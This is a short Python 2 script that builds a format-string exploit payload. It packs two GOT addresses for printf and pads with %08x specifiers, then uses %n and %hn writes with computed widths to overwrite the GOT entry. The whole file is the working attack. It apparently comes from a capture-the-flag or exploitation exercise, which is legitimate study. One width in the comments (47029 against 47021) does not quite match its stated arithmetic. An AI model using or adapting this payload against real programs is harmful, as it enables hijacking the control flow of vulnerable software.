import struct

payload  = struct.pack('<L', 0x0804a00e)
payload += "JUNK"
payload += struct.pack('<L', 0x0804a00c)

payload += " %08x" * 4
payload += " %47029x"  # 0x804a00c <printf@got.plt>: 0xb7e60280 -> hex(0xb7e6-0x0041+8 ) -> 47021
payload += "%n"        # first write ^
payload += "%31146x"   # 0x804a00c <printf@got.plt>: 0xb7e63091 -> hex(0x13190-0xb7ee+8) -> 31146
payload += "%hn"       # second write ^

print payload
